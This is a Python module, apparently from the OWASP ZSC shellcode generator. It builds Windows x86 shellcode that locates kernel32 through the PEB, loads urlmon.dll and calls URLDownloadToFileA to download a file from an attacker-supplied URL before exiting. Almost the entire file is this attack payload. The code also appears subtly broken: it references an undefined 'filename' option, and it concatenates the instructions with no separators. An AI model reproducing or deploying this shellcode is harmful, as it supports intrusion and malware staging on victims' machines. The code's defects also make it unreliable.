
"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import stack
from owasp_zsc.new_cores import base_module


class Module(base_module.BasePayload):
    url = base_module.OptString("", "URL to download")  # TODO improve descr
    file_dest = base_module.OptString("", "File name")  # TODO improve descr

    def generate(self):
        payload = "xor    %ecx, %ecx"
        payload += "mov    %fs:0x30(%ecx), %eax"
        payload += "mov    0xc(%eax), %eax"
        payload += "mov    0x14(%eax), %esi"
        payload += "lods   %ds:(%esi), %eax"
        payload += "xchg   %eax, %esi"
        payload += "lods   %ds:(%esi), %eax"
        payload += "mov    0x10(%eax), %ebx"
        payload += "mov    0x3c(%ebx), %edx"
        payload += "add    %ebx, %edx"
        payload += "mov    0x78(%edx), %edx"
        payload += "add    %ebx, %edx"
        payload += "mov    0x20(%edx), %esi"
        payload += "add    %ebx, %esi"
        payload += "xor    %ecx, %ecx"
        payload += "inc    %ecx"
        payload += "lods   %ds:(%esi), %eax"
        payload += "add    %ebx, %eax"
        payload += "cmpl   $0x50746547, (%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x41636f72, 0x4(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "cmpl   $0x65726464, 0x8(%eax)"
        payload += "jne    23 <.text+0x23>"
        payload += "mov    0x24(%edx), %esi"
        payload += "add    %ebx, %esi"
        payload += "mov    (%esi, %ecx, 2), %cx"
        payload += "dec    %ecx"
        payload += "mov    0x1c(%edx), %esi"
        payload += "add    %ebx, %esi"
        payload += "mov    (%esi, %ecx, 4), %edx"
        payload += "add    %ebx, %edx"
        payload += "xor    %esi, %esi"
        payload += "mov    %edx, %esi"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += "push   $0x41797261"
        payload += "push   $0x7262694c"
        payload += "push   $0x64616f4c"
        payload += "push   %esp"
        payload += "push   %ebx"
        payload += "call   *%edx"
        payload += "xor    %ecx, %ecx"
        payload += "mov    $0x6c6c, %cx"
        payload += "push   %ecx"
        payload += "push   $0x642e6e6f"
        payload += "push   $0x6d6c7275"
        payload += "push   %esp"
        payload += "call   *%eax"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += "mov    $0x4165, %cx"
        payload += "push   %ecx"
        payload += "push   $0x6c69466f"
        payload += "push   $0x5464616f"
        payload += "push   $0x6c6e776f"
        payload += "push   $0x444c5255"
        payload += "mov    %esp, %ecx"
        payload += "push   %ecx"
        payload += "push   %eax"
        payload += "call   *%esi"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += stack.generate(self.url, "%ecx", "string")
        payload += "xor    %edi, %edi"
        payload += "mov    %esp, %edi"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += stack.generate(self.filename, "%ecx", "string")
        payload += "xor    %edx, %edx"
        payload += "mov    %esp, %edx"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += "push   %ecx"
        payload += "push   %edx"
        payload += "push   %edi"
        payload += "push   %ecx"
        payload += "call   *%eax"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += "push   $0x73736590"
        payload += "pop    %ecx"
        payload += "shr    $0x8, %ecx"
        payload += "push   %ecx"
        payload += "push   $0x636f7250"
        payload += "push   $0x74697845"
        payload += "push   %esp"
        payload += "push   %ebx"
        payload += "call   *%esi"
        payload += "xor    %ecx, %ecx"
        payload += "push   %ecx"
        payload += "call   *%eax"
        return payload

    def run(self):
        print(self.generate())
